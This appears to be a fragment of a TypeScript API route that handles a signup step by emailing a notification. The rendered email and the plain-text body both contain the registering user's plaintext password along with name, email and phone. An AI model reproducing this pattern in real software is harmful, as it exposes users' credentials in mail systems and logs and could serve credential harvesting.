...
export async function POST(request: Request) {
  try {
    ...
    if (step === "registration") {
      ...
      emailHtml = render(<RegistrationEmail name={name} email={email} phone={phone} password={password} />)
    ...
    await transporter.sendMail({
      ...
      text:
        step === "registration"
          ? `New signup from ${data.name} (${data.email}), phone: ${data.phone}, password: ${data.password}`
